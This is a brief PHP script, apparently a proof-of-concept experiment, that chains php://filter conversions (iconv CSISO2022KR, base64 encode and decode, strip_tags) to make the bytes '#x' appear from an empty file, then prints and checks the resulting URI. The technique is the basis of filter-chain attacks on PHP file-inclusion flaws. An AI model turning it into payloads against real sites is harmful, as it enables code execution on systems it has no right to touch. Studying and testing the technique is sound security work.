<?php
$table = json_decode(file_get_contents('table.json'), true);
$filters = ['convert.iconv.UTF8.CSISO2022KR', 'convert.iconv.UTF8.CSISO2022KR', 'convert.iconv.UTF8.CSISO2022KR', 'convert.iconv.UTF8.CSISO2022KR', 'convert.iconv.UTF8.CSISO2022KR', 'convert.iconv.UTF8.CSISO2022KR', 'convert.base64-encode'];
foreach (str_split(strrev(base64_encode('#x<'))) as $c) {
    $filters = array_merge($filters, $table[$c]);
}
array_push($filters, 'convert.base64-decode');
array_push($filters, 'string.strip_tags');
$f = implode('|', $filters);
$u = "php://filter/$f/resource=empty.txt";
echo $u . "\n";
echo strlen($u) . "\n";
var_dump(file_get_contents($u));
var_dump(file_get_contents($u) === '#x');
